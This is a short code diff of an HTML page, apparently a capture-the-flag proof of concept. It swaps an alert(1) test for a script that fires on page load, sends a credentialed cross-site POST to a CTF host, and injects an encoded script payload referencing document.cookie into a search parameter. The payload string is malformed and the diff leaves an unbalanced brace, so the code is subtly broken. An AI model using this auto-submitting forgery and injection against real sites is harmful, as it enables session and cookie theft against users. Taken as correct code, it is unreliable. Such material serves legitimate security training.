@@ -3,11 +3,25 @@
   <body>
     <script>
       function submitRequest() {
-        alert(1);
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "http://ctf.widyasecurity.com/upload", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  xhr.withCredentials = true;
+
+  var payload = "</script>(document.cookie)>";
+  var encodedPayload = encodeURIComponent(payload);
+
+  var formData = "searchFor=" + encodedPayload + "&goButton=";
+
+  xhr.send(formData);
+}
+
       }
-      document.addEventListener("DOMContentLoaded", function() {
+      
+      // Automatically submit the request when the page loads
+      window.onload = function() {
         submitRequest();
-      });
+      };
     </script>
   </body>
 </html>
